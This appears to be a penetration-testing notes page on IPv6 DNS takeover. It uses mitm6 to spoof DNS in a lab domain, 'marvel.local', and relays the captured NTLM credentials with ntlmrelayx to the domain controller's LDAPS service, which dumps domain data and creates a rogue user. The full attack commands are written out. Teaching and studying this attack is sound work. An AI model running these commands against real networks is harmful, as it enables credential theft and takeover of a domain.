# 6️⃣ IPv6 Attacks

IPv6 attacks take advantage of the fact that IPv6 usage is not as widespread as IPv4. If IPv6 is enabled but not actively utilized, it often goes unchecked. Attackers exploit this vulnerability by impersonating the DNS (Domain Name System). Essentially, the attacker claims, "I am your DNS; send me all your traffic so I can redirect it to the appropriate resources." For instance, when a connection attempt is made to the domain controller, it unwittingly sends credentials to the attacker.

This type of attack involves what is known as LDAP relay, where the attacker establishes a connection to the Domain Controller (DC) using the acquired NTLM credentials. This tactic is commonly referred to as "Man-in-the-Middle 6," aimed at creating an entry point within the infrastructure. The goal is to infiltrate the system and establish a presence by generating a user account.

<figure><img src="../../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

**Install ntlmrelayx.py**

* **Download ntlmrelayx.py:** Visit the GitHub repository [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) and download the script.
* **Execute ntlmrelayx.py:** Open a terminal and navigate to the directory where you downloaded ntlmrelayx.py. Run the following command:

```
python ntlmrelayx.py -6 -t ldaps://172.16.91.129 -wh fakewpad.marvel.local -l lootme
```

* `-6`: Specifies the use of IPv6.
* `-t ldaps://172.16.91.129`: Target LDAP server, using the ldaps protocol, located at IP address 172.16.91.129.
* `-wh fakewpad.marvel.local`: Redirects NTLM authentication attempts to this fake host, fakewpad.marvel.local.
* `-l lootme`: Creates files in the 'lootme' directory containing important content of the attack.

**Install mitm6**

* **Download mitm6:** Visit the GitHub repository [mitm6](https://github.com/dirkjanm/mitm6) and download the mitm6 script.
* **Execute mitm6:** Open another terminal and navigate to the directory where you downloaded mitm6.py. Run the following command:

```
python mitm6.py -d marvel.local 
```

`-d marvel.local`: Specifies the target domain as marvel.local for which mitm6 will perform a man-in-the-middle attack.

<figure><img src="../../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

The `-l lootme` option in the first command is essential, as it ensures the creation of files containing vital information for the ongoing attack.

<figure><img src="../../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

Information obtained from the attack files can be used to identify unused accounts and potentially detect honeypots.

Clear-text passwords may be exposed if administrators include them in user/group descriptions, assuming that only administrators have access to this information.

In the potential scenario, if an administrator were to connect to the domain, the intention is for `mitm6` to carry out an infiltration of the Domain Controller (DC), subsequently establishing a new user with valid credentials. This process involves exploiting vulnerabilities or injecting malicious payloads into the DC's environment.

By strategically targeting an administrator's connection to the domain, the attack aims to exploit security weaknesses within the infrastructure. `mitm6` could leverage this access to compromise the integrity of the Domain Controller, thereby gaining unauthorized privileges. Subsequently, a new user account with legitimate credentials might be generated as part of the broader objective.

<figure><img src="../../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

The act of infecting the Domain Controller and creating a user with valid credentials underscores the potential severity of the security breach. Unauthorized access to sensitive systems and the establishment of new user accounts with legitimate privileges could lead to a range of adverse consequences, including unauthorized data access, system manipulation, or unauthorized control over critical resources.

<figure><img src="../../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

Good documentation: [https://www.blackhillsinfosec.com/mitm6-strikes-again-the-dark-side-of-ipv6/](https://www.blackhillsinfosec.com/mitm6-strikes-again-the-dark-side-of-ipv6/)
